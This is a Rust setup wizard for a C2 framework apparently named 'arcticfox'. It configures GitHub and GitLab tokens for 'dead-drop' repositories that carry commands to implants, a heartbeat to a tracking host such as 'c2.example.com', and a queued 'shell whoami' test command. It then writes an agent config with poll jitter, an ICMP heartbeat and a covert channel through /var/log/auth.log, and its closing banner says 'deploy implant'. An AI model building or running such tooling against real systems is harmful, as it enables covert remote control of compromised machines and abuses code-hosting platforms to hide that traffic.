//! Guided Setup Wizard — walks user through first-time configuration.

use crate::api::ApiClient;
use std::io::{self, Write};

pub async fn run_setup() {
    println!("\n╔══════════════════════════════════════════════╗");
    println!("║                                              ║");
    println!("║      C3 Guided Setup Wizard                  ║");
    println!("║                                              ║");
    println!("║  Configures your infrastructure step by step. ║");
    println!("║  Ctrl+C to exit at any time.                 ║");
    println!("║                                              ║");
    println!("╚══════════════════════════════════════════════╝\n");

    // Step 0: API server
    println!("── Step 0: API Server ──");
    let api_url = prompt_default("API server URL", "http://localhost:7443");
    if api_url.is_empty() { println!("Empty input — exiting.\n"); return; }

    let api = loop {
        let default_token = read_token_from_file();
        let prompt_text = if !default_token.is_empty() {
            format!("Admin token [{}...]", &default_token[..default_token.len().min(16)])
        } else {
            "Admin token (start the API server first: cargo run --bin arcticfox-api)".into()
        };
        let token = prompt_default(&prompt_text, &default_token);
        if token.is_empty() || token == "quit" { println!("Exiting.\n"); return; }

        let api = ApiClient::new(&api_url, &token);
        match api.whoami().await {
            Ok(role) => { println!("  Connected. Role: {role}\n"); break api; }
            Err(e) => {
                println!("  Auth failed: {e}");
                println!("  Make sure the API server is running (cargo run --bin arcticfox-api)");
                println!("  Type 'quit' to exit or press Enter to retry.\n");
            }
        }
    };

    // Step 1: GitHub token
    println!("── Step 1: GitHub Token ──");
    let gh = prompt_default("GitHub classic PAT (repo scope, Enter to skip)", "");
    if gh.is_empty() { println!("  Skipped.\n"); }
    else { let _ = api.set_tokens(Some(&gh), None).await; println!("  Set.\n"); }

    // Step 2: GitLab token
    println!("── Step 2: GitLab Token ──");
    let gl = prompt_default("GitLab PAT (Enter to skip)", "");
    if gl.is_empty() { println!("  Skipped.\n"); }
    else { let _ = api.set_tokens(None, Some(&gl)).await; println!("  Set.\n"); }

    // Step 3: Dead-drop repo
    println!("── Step 3: Dead-Drop Repository ──");
    println!("  Where commands are delivered. Format: gh:owner/repo\n");
    let repo = prompt_default("Repo spec (e.g. gh:myorg/c2-repo)", "");
    if repo.is_empty() { println!("  Skipped.\n"); }
    else {
        match api.add_repo(&repo).await {
            Ok(v) => println!("  Added: {}\n", v["added"]["label"].as_str().unwrap_or(&repo)),
            Err(e) => println!("  Failed: {e}\n"),
        }
    }

    // Step 4: Heartbeat
    println!("── Step 4: Heartbeat ──");
    let hb_url = prompt_default("Redirect URL", "https://www.google.com/url?q=");
    let hb_track = prompt_default("Tracking URL (e.g. http://c2.example.com/api/heartbeat/{hash})", "");
    let hb_secs = prompt_default("Interval (seconds)", "300");
    let _ = api.set_heartbeat(Some(&hb_url), if hb_track.is_empty() { None } else { Some(&hb_track) }, Some(hb_secs.parse().unwrap_or(300))).await;
    println!("  Configured.\n");

    // Step 5: Test command
    println!("── Step 5: Test Command ──");
    let cmd = prompt_default("Command (e.g. shell whoami)", "shell whoami");
    if !cmd.is_empty() {
        let _ = api.add_command(&cmd).await;
        let push = prompt_default("Push to dead-drop now? (y/N)", "n");
        if push.to_lowercase().starts_with('y') {
            match api.push(None, false).await {
                Ok(_) => println!("  Pushed!\n"),
                Err(e) => println!("  Push failed: {e}\n"),
            }
        } else { println!("  Queued. Push later from dashboard (p key).\n"); }
    }

    // Step 6: Agent config
    println!("── Step 6: Agent Config ──");
    match api.list_repos().await {
        Ok(repos) if !repos.is_empty() => {
            let repos_json: Vec<serde_json::Value> = repos.iter().map(|r| serde_json::json!({
                "owner": r.owner, "repo": r.repo, "platform": r.platform,
                "branch": r.branch, "file_path": r.file_path, "active": true
            })).collect();
            let config = serde_json::json!({
                "repos": repos_json, "poll_interval": 60, "jitter": 15,
                "max_fails_before_skip": 5, "use_api": false,
                "icmp_heartbeat_dest": "8.8.8.8", "icmp_heartbeat_interval": 300,
                "log_covert_path": "/var/log/auth.log", "log_covert_interval": 600
            });
            let path = prompt_default("Save to", "pb_config.json");
            if !path.is_empty() {
                match serde_json::to_string_pretty(&config) {
                    Ok(json) => {
                        let _ = std::fs::write(&path, &json);
                        println!("  Saved to {path}");
                        println!("  Deploy: cargo run --bin arcticfox-agent -- --config {path}\n");
                    }
                    Err(e) => println!("  Failed to serialize: {e}\n"),
                }
            }
        }
        Ok(_) => println!("  No repos configured yet. Add repos first (Step 3).\n"),
        Err(e) => println!("  Failed to list repos: {e}\n"),
    }

    // Save
    let _ = api.save_config().await;
    println!("╔══════════════════════════════════════════════╗");
    println!("║                                              ║");
    println!("║      Setup Complete!                         ║");
    println!("║                                              ║");
    println!("║  Next:  make dashboard   (8-tab TUI)         ║");
    println!("║         make agent       (deploy implant)    ║");
    println!("║         cat docs/Home.md (documentation)     ║");
    println!("║                                              ║");
    println!("╚══════════════════════════════════════════════╝\n");
}

fn read_token_from_file() -> String {
    if let Ok(content) = std::fs::read_to_string("api_config.json") {
        if let Some(start) = content.find("\"admin_token\": \"") {
            let prefix_len = "\"admin_token\": \"".len();
            let rest = &content[start + prefix_len..];
            if let Some(end) = rest.find('"') {
                return rest[..end].to_string();
            }
        }
    }
    String::new()
}

fn prompt(msg: &str) -> String {
    print!("  > {msg}: ");
    io::stdout().flush().ok();
    let mut input = String::new();
    match io::stdin().read_line(&mut input) {
        Ok(0) => { println!(); String::new() }
        Ok(_) => input.trim().to_string(),
        Err(_) => String::new(),
    }
}

fn prompt_default(msg: &str, default: &str) -> String {
    if default.is_empty() {
        return prompt(msg);
    }
    print!("  > {msg} [{default}]: ");
    io::stdout().flush().ok();
    let mut input = String::new();
    match io::stdin().read_line(&mut input) {
        Ok(0) => { println!(); String::new() }
        Ok(_) => {
            let input = input.trim().to_string();
            if input.is_empty() { default.to_string() } else { input }
        }
        Err(_) => String::new(),
    }
}
